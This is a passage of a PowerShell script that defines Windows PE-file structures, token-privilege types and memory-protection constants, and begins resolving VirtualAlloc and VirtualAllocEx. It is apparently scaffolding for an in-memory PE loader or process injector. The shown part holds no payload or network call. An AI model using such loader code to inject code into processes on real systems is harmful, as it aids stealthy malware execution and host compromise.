        $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_APPLICATION', [UInt16] 10) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_BOOT_SERVICE_DRIVER', [UInt16] 11) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_RUNTIME_DRIVER', [UInt16] 12) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_ROM', [UInt16] 13) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_XBOX', [UInt16] 14) | Out-Null
        $SubSystemType = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name SubSystemType -Value $SubSystemType

        #Enum DllCharacteristicsType
        $TypeBuilder = $ModuleBuilder.DefineEnum('DllCharacteristicsType', 'Public', [UInt16])
        $TypeBuilder.DefineLiteral('RES_0', [UInt16] 0x0001) | Out-Null
        $TypeBuilder.DefineLiteral('RES_1', [UInt16] 0x0002) | Out-Null
        $TypeBuilder.DefineLiteral('RES_2', [UInt16] 0x0004) | Out-Null
        $TypeBuilder.DefineLiteral('RES_3', [UInt16] 0x0008) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_DYNAMIC_BASE', [UInt16] 0x0040) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_FORCE_INTEGRITY', [UInt16] 0x0080) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_NX_COMPAT', [UInt16] 0x0100) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_ISOLATION', [UInt16] 0x0200) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_SEH', [UInt16] 0x0400) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_BIND', [UInt16] 0x0800) | Out-Null
        $TypeBuilder.DefineLiteral('RES_4', [UInt16] 0x1000) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_WDM_DRIVER', [UInt16] 0x2000) | Out-Null
        $TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_TERMINAL_SERVER_AWARE', [UInt16] 0x8000) | Out-Null
        $DllCharacteristicsType = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name DllCharacteristicsType -Value $DllCharacteristicsType

        ########### STRUCT ###########
        #Struct IMAGE_DATA_DIRECTORY
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_DATA_DIRECTORY', $Attributes, [System.ValueType], 8)
        ($TypeBuilder.DefineField('VirtualAddress', [UInt32], 'Public')).SetOffset(0) | Out-Null
        ($TypeBuilder.DefineField('Size', [UInt32], 'Public')).SetOffset(4) | Out-Null
        $IMAGE_DATA_DIRECTORY = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_DATA_DIRECTORY -Value $IMAGE_DATA_DIRECTORY

        #Struct IMAGE_FILE_HEADER
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_FILE_HEADER', $Attributes, [System.ValueType], 20)
        $TypeBuilder.DefineField('Machine', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('NumberOfSections', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('TimeDateStamp', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('PointerToSymbolTable', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('NumberOfSymbols', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('SizeOfOptionalHeader', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('Characteristics', [UInt16], 'Public') | Out-Null
        $IMAGE_FILE_HEADER = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_HEADER -Value $IMAGE_FILE_HEADER

        #Struct IMAGE_OPTIONAL_HEADER64
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_OPTIONAL_HEADER64', $Attributes, [System.ValueType], 240)
        ($TypeBuilder.DefineField('Magic', $MagicType, 'Public')).SetOffset(0) | Out-Null
        ($TypeBuilder.DefineField('MajorLinkerVersion', [Byte], 'Public')).SetOffset(2) | Out-Null
        ($TypeBuilder.DefineField('MinorLinkerVersion', [Byte], 'Public')).SetOffset(3) | Out-Null
        ($TypeBuilder.DefineField('SizeOfCode', [UInt32], 'Public')).SetOffset(4) | Out-Null
        ($TypeBuilder.DefineField('SizeOfInitializedData', [UInt32], 'Public')).SetOffset(8) | Out-Null
        ($TypeBuilder.DefineField('SizeOfUninitializedData', [UInt32], 'Public')).SetOffset(12) | Out-Null
        ($TypeBuilder.DefineField('AddressOfEntryPoint', [UInt32], 'Public')).SetOffset(16) | Out-Null
        ($TypeBuilder.DefineField('BaseOfCode', [UInt32], 'Public')).SetOffset(20) | Out-Null
        ($TypeBuilder.DefineField('ImageBase', [UInt64], 'Public')).SetOffset(24) | Out-Null
        ($TypeBuilder.DefineField('SectionAlignment', [UInt32], 'Public')).SetOffset(32) | Out-Null
        ($TypeBuilder.DefineField('FileAlignment', [UInt32], 'Public')).SetOffset(36) | Out-Null
        ($TypeBuilder.DefineField('MajorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(40) | Out-Null
        ($TypeBuilder.DefineField('MinorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(42) | Out-Null
        ($TypeBuilder.DefineField('MajorImageVersion', [UInt16], 'Public')).SetOffset(44) | Out-Null
        ($TypeBuilder.DefineField('MinorImageVersion', [UInt16], 'Public')).SetOffset(46) | Out-Null
        ($TypeBuilder.DefineField('MajorSubsystemVersion', [UInt16], 'Public')).SetOffset(48) | Out-Null
        ($TypeBuilder.DefineField('MinorSubsystemVersion', [UInt16], 'Public')).SetOffset(50) | Out-Null
        ($TypeBuilder.DefineField('Win32VersionValue', [UInt32], 'Public')).SetOffset(52) | Out-Null
        ($TypeBuilder.DefineField('SizeOfImage', [UInt32], 'Public')).SetOffset(56) | Out-Null
        ($TypeBuilder.DefineField('SizeOfHeaders', [UInt32], 'Public')).SetOffset(60) | Out-Null
        ($TypeBuilder.DefineField('CheckSum', [UInt32], 'Public')).SetOffset(64) | Out-Null
        ($TypeBuilder.DefineField('Subsystem', $SubSystemType, 'Public')).SetOffset(68) | Out-Null
        ($TypeBuilder.DefineField('DllCharacteristics', $DllCharacteristicsType, 'Public')).SetOffset(70) | Out-Null
        ($TypeBuilder.DefineField('SizeOfStackReserve', [UInt64], 'Public')).SetOffset(72) | Out-Null
        ($TypeBuilder.DefineField('SizeOfStackCommit', [UInt64], 'Public')).SetOffset(80) | Out-Null
        ($TypeBuilder.DefineField('SizeOfHeapReserve', [UInt64], 'Public')).SetOffset(88) | Out-Null
        ($TypeBuilder.DefineField('SizeOfHeapCommit', [UInt64], 'Public')).SetOffset(96) | Out-Null
        ($TypeBuilder.DefineField('LoaderFlags', [UInt32], 'Public')).SetOffset(104) | Out-Null
        ($TypeBuilder.DefineField('NumberOfRvaAndSizes', [UInt32], 'Public')).SetOffset(108) | Out-Null
        ($TypeBuilder.DefineField('ExportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(112) | Out-Null
        ($TypeBuilder.DefineField('ImportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(120) | Out-Null
        ($TypeBuilder.DefineField('ResourceTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(128) | Out-Null
        ($TypeBuilder.DefineField('ExceptionTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(136) | Out-Null
        ($TypeBuilder.DefineField('CertificateTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(144) | Out-Null
        ($TypeBuilder.DefineField('BaseRelocationTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(152) | Out-Null
        ($TypeBuilder.DefineField('Debug', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(160) | Out-Null
        ($TypeBuilder.DefineField('Architecture', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(168) | Out-Null
        ($TypeBuilder.DefineField('GlobalPtr', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(176) | Out-Null
        ($TypeBuilder.DefineField('TLSTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(184) | Out-Null
        ($TypeBuilder.DefineField('LoadConfigTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(192) | Out-Null
        ($TypeBuilder.DefineField('BoundImport', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(200) | Out-Null
        ($TypeBuilder.DefineField('IAT', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(208) | Out-Null
        ($TypeBuilder.DefineField('DelayImportDescriptor', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(216) | Out-Null
        ($TypeBuilder.DefineField('CLRRuntimeHeader', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(224) | Out-Null
        ($TypeBuilder.DefineField('Reserved', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(232) | Out-Null
        $IMAGE_OPTIONAL_HEADER64 = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_OPTIONAL_HEADER64 -Value $IMAGE_OPTIONAL_HEADER64

        #Struct IMAGE_OPTIONAL_HEADER32
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_OPTIONAL_HEADER32', $Attributes, [System.ValueType], 224)
        ($TypeBuilder.DefineField('Magic', $MagicType, 'Public')).SetOffset(0) | Out-Null
        ($TypeBuilder.DefineField('MajorLinkerVersion', [Byte], 'Public')).SetOffset(2) | Out-Null
        ($TypeBuilder.DefineField('MinorLinkerVersion', [Byte], 'Public')).SetOffset(3) | Out-Null
        ($TypeBuilder.DefineField('SizeOfCode', [UInt32], 'Public')).SetOffset(4) | Out-Null
        ($TypeBuilder.DefineField('SizeOfInitializedData', [UInt32], 'Public')).SetOffset(8) | Out-Null
        ($TypeBuilder.DefineField('SizeOfUninitializedData', [UInt32], 'Public')).SetOffset(12) | Out-Null
        ($TypeBuilder.DefineField('AddressOfEntryPoint', [UInt32], 'Public')).SetOffset(16) | Out-Null
        ($TypeBuilder.DefineField('BaseOfCode', [UInt32], 'Public')).SetOffset(20) | Out-Null
        ($TypeBuilder.DefineField('BaseOfData', [UInt32], 'Public')).SetOffset(24) | Out-Null
        ($TypeBuilder.DefineField('ImageBase', [UInt32], 'Public')).SetOffset(28) | Out-Null
        ($TypeBuilder.DefineField('SectionAlignment', [UInt32], 'Public')).SetOffset(32) | Out-Null
        ($TypeBuilder.DefineField('FileAlignment', [UInt32], 'Public')).SetOffset(36) | Out-Null
        ($TypeBuilder.DefineField('MajorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(40) | Out-Null
        ($TypeBuilder.DefineField('MinorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(42) | Out-Null
        ($TypeBuilder.DefineField('MajorImageVersion', [UInt16], 'Public')).SetOffset(44) | Out-Null
        ($TypeBuilder.DefineField('MinorImageVersion', [UInt16], 'Public')).SetOffset(46) | Out-Null
        ($TypeBuilder.DefineField('MajorSubsystemVersion', [UInt16], 'Public')).SetOffset(48) | Out-Null
        ($TypeBuilder.DefineField('MinorSubsystemVersion', [UInt16], 'Public')).SetOffset(50) | Out-Null
        ($TypeBuilder.DefineField('Win32VersionValue', [UInt32], 'Public')).SetOffset(52) | Out-Null
        ($TypeBuilder.DefineField('SizeOfImage', [UInt32], 'Public')).SetOffset(56) | Out-Null
        ($TypeBuilder.DefineField('SizeOfHeaders', [UInt32], 'Public')).SetOffset(60) | Out-Null
        ($TypeBuilder.DefineField('CheckSum', [UInt32], 'Public')).SetOffset(64) | Out-Null
        ($TypeBuilder.DefineField('Subsystem', $SubSystemType, 'Public')).SetOffset(68) | Out-Null
        ($TypeBuilder.DefineField('DllCharacteristics', $DllCharacteristicsType, 'Public')).SetOffset(70) | Out-Null
        ($TypeBuilder.DefineField('SizeOfStackReserve', [UInt32], 'Public')).SetOffset(72) | Out-Null
        ($TypeBuilder.DefineField('SizeOfStackCommit', [UInt32], 'Public')).SetOffset(76) | Out-Null
        ($TypeBuilder.DefineField('SizeOfHeapReserve', [UInt32], 'Public')).SetOffset(80) | Out-Null
        ($TypeBuilder.DefineField('SizeOfHeapCommit', [UInt32], 'Public')).SetOffset(84) | Out-Null
        ($TypeBuilder.DefineField('LoaderFlags', [UInt32], 'Public')).SetOffset(88) | Out-Null
        ($TypeBuilder.DefineField('NumberOfRvaAndSizes', [UInt32], 'Public')).SetOffset(92) | Out-Null
        ($TypeBuilder.DefineField('ExportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(96) | Out-Null
        ($TypeBuilder.DefineField('ImportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(104) | Out-Null
        ($TypeBuilder.DefineField('ResourceTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(112) | Out-Null
        ($TypeBuilder.DefineField('ExceptionTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(120) | Out-Null
        ($TypeBuilder.DefineField('CertificateTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(128) | Out-Null
        ($TypeBuilder.DefineField('BaseRelocationTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(136) | Out-Null
        ($TypeBuilder.DefineField('Debug', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(144) | Out-Null
        ($TypeBuilder.DefineField('Architecture', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(152) | Out-Null
        ($TypeBuilder.DefineField('GlobalPtr', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(160) | Out-Null
        ($TypeBuilder.DefineField('TLSTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(168) | Out-Null
        ($TypeBuilder.DefineField('LoadConfigTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(176) | Out-Null
        ($TypeBuilder.DefineField('BoundImport', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(184) | Out-Null
        ($TypeBuilder.DefineField('IAT', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(192) | Out-Null
        ($TypeBuilder.DefineField('DelayImportDescriptor', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(200) | Out-Null
        ($TypeBuilder.DefineField('CLRRuntimeHeader', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(208) | Out-Null
        ($TypeBuilder.DefineField('Reserved', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(216) | Out-Null
        $IMAGE_OPTIONAL_HEADER32 = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_OPTIONAL_HEADER32 -Value $IMAGE_OPTIONAL_HEADER32

        #Struct IMAGE_NT_HEADERS64
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_NT_HEADERS64', $Attributes, [System.ValueType], 264)
        $TypeBuilder.DefineField('Signature', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('FileHeader', $IMAGE_FILE_HEADER, 'Public') | Out-Null
        $TypeBuilder.DefineField('OptionalHeader', $IMAGE_OPTIONAL_HEADER64, 'Public') | Out-Null
        $IMAGE_NT_HEADERS64 = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS64 -Value $IMAGE_NT_HEADERS64
        
        #Struct IMAGE_NT_HEADERS32
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_NT_HEADERS32', $Attributes, [System.ValueType], 248)
        $TypeBuilder.DefineField('Signature', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('FileHeader', $IMAGE_FILE_HEADER, 'Public') | Out-Null
        $TypeBuilder.DefineField('OptionalHeader', $IMAGE_OPTIONAL_HEADER32, 'Public') | Out-Null
        $IMAGE_NT_HEADERS32 = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS32 -Value $IMAGE_NT_HEADERS32

        #Struct IMAGE_DOS_HEADER
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_DOS_HEADER', $Attributes, [System.ValueType], 64)
        $TypeBuilder.DefineField('e_magic', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_cblp', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_cp', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_crlc', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_cparhdr', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_minalloc', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_maxalloc', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_ss', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_sp', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_csum', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_ip', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_cs', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_lfarlc', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_ovno', [UInt16], 'Public') | Out-Null

        $e_resField = $TypeBuilder.DefineField('e_res', [UInt16[]], 'Public, HasFieldMarshal')
        $ConstructorValue = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
        $FieldArray = @([System.Runtime.InteropServices.MarshalAsAttribute].GetField('SizeConst'))
        $AttribBuilder = New-Object System.Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, $ConstructorValue, $FieldArray, @([Int32] 4))
        $e_resField.SetCustomAttribute($AttribBuilder)

        $TypeBuilder.DefineField('e_oemid', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('e_oeminfo', [UInt16], 'Public') | Out-Null

        $e_res2Field = $TypeBuilder.DefineField('e_res2', [UInt16[]], 'Public, HasFieldMarshal')
        $ConstructorValue = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
        $AttribBuilder = New-Object System.Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, $ConstructorValue, $FieldArray, @([Int32] 10))
        $e_res2Field.SetCustomAttribute($AttribBuilder)

        $TypeBuilder.DefineField('e_lfanew', [Int32], 'Public') | Out-Null
        $IMAGE_DOS_HEADER = $TypeBuilder.CreateType()    
        $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_DOS_HEADER -Value $IMAGE_DOS_HEADER

        #Struct IMAGE_SECTION_HEADER
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_SECTION_HEADER', $Attributes, [System.ValueType], 40)

        $nameField = $TypeBuilder.DefineField('Name', [Char[]], 'Public, HasFieldMarshal')
        $ConstructorValue = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
        $AttribBuilder = New-Object System.Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, $ConstructorValue, $FieldArray, @([Int32] 8))
        $nameField.SetCustomAttribute($AttribBuilder)

        $TypeBuilder.DefineField('VirtualSize', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('VirtualAddress', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('SizeOfRawData', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('PointerToRawData', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('PointerToRelocations', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('PointerToLinenumbers', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('NumberOfRelocations', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('NumberOfLinenumbers', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('Characteristics', [UInt32], 'Public') | Out-Null
        $IMAGE_SECTION_HEADER = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_SECTION_HEADER -Value $IMAGE_SECTION_HEADER

        #Struct IMAGE_BASE_RELOCATION
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_BASE_RELOCATION', $Attributes, [System.ValueType], 8)
        $TypeBuilder.DefineField('VirtualAddress', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('SizeOfBlock', [UInt32], 'Public') | Out-Null
        $IMAGE_BASE_RELOCATION = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_BASE_RELOCATION -Value $IMAGE_BASE_RELOCATION

        #Struct IMAGE_IMPORT_DESCRIPTOR
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_IMPORT_DESCRIPTOR', $Attributes, [System.ValueType], 20)
        $TypeBuilder.DefineField('Characteristics', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('TimeDateStamp', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('ForwarderChain', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('Name', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('FirstThunk', [UInt32], 'Public') | Out-Null
        $IMAGE_IMPORT_DESCRIPTOR = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_IMPORT_DESCRIPTOR -Value $IMAGE_IMPORT_DESCRIPTOR

        #Struct IMAGE_EXPORT_DIRECTORY
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_EXPORT_DIRECTORY', $Attributes, [System.ValueType], 40)
        $TypeBuilder.DefineField('Characteristics', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('TimeDateStamp', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('MajorVersion', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('MinorVersion', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('Name', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('Base', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('NumberOfFunctions', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('NumberOfNames', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('AddressOfFunctions', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('AddressOfNames', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('AddressOfNameOrdinals', [UInt32], 'Public') | Out-Null
        $IMAGE_EXPORT_DIRECTORY = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_EXPORT_DIRECTORY -Value $IMAGE_EXPORT_DIRECTORY
        
        #Struct LUID
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('LUID', $Attributes, [System.ValueType], 8)
        $TypeBuilder.DefineField('LowPart', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('HighPart', [UInt32], 'Public') | Out-Null
        $LUID = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name LUID -Value $LUID
        
        #Struct LUID_AND_ATTRIBUTES
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('LUID_AND_ATTRIBUTES', $Attributes, [System.ValueType], 12)
        $TypeBuilder.DefineField('Luid', $LUID, 'Public') | Out-Null
        $TypeBuilder.DefineField('Attributes', [UInt32], 'Public') | Out-Null
        $LUID_AND_ATTRIBUTES = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name LUID_AND_ATTRIBUTES -Value $LUID_AND_ATTRIBUTES
        
        #Struct TOKEN_PRIVILEGES
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('TOKEN_PRIVILEGES', $Attributes, [System.ValueType], 16)
        $TypeBuilder.DefineField('PrivilegeCount', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('Privileges', $LUID_AND_ATTRIBUTES, 'Public') | Out-Null
        $TOKEN_PRIVILEGES = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name TOKEN_PRIVILEGES -Value $TOKEN_PRIVILEGES

        return $Win32Types
    }

    Function Get-Win32Constants
    {
        $Win32Constants = New-Object System.Object
        
        $Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_COMMIT -Value 0x00001000
        $Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_RESERVE -Value 0x00002000
        $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_NOACCESS -Value 0x01
        $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_READONLY -Value 0x02
        $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_READWRITE -Value 0x04
        $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_WRITECOPY -Value 0x08
        $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE -Value 0x10
        $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_READ -Value 0x20
        $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_READWRITE -Value 0x40
        $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_WRITECOPY -Value 0x80
        $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_NOCACHE -Value 0x200
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_ABSOLUTE -Value 0
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_HIGHLOW -Value 3
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_DIR64 -Value 10
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_DISCARDABLE -Value 0x02000000
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_EXECUTE -Value 0x20000000
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_READ -Value 0x40000000
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_WRITE -Value 0x80000000
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_NOT_CACHED -Value 0x04000000
        $Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_DECOMMIT -Value 0x4000
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_EXECUTABLE_IMAGE -Value 0x0002
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_DLL -Value 0x2000
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE -Value 0x40
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_DLLCHARACTERISTICS_NX_COMPAT -Value 0x100
        $Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_RELEASE -Value 0x8000
        $Win32Constants | Add-Member -MemberType NoteProperty -Name TOKEN_QUERY -Value 0x0008
        $Win32Constants | Add-Member -MemberType NoteProperty -Name TOKEN_ADJUST_PRIVILEGES -Value 0x0020
        $Win32Constants | Add-Member -MemberType NoteProperty -Name SE_PRIVILEGE_ENABLED -Value 0x2
        $Win32Constants | Add-Member -MemberType NoteProperty -Name ERROR_NO_TOKEN -Value 0x3f0
        
        return $Win32Constants
    }

    Function Get-Win32Functions
    {
        $Win32Functions = New-Object System.Object
        
        $VirtualAllocAddr = Get-ProcAddress kernel32.dll VirtualAlloc
        $VirtualAllocDelegate = Get-DelegateType @([IntPtr], [UIntPtr], [UInt32], [UInt32]) ([IntPtr])
        $VirtualAlloc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualAllocAddr, $VirtualAllocDelegate)
        $Win32Functions | Add-Member NoteProperty -Name VirtualAlloc -Value $VirtualAlloc
        
        $VirtualAllocExAddr = Get-ProcAddress kernel32.dll VirtualAllocEx
        $VirtualAllocExDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr], [UInt32], [UInt32]) ([IntPtr])
        $VirtualAllocEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualAllocExAddr, $VirtualAllocExDelegate)
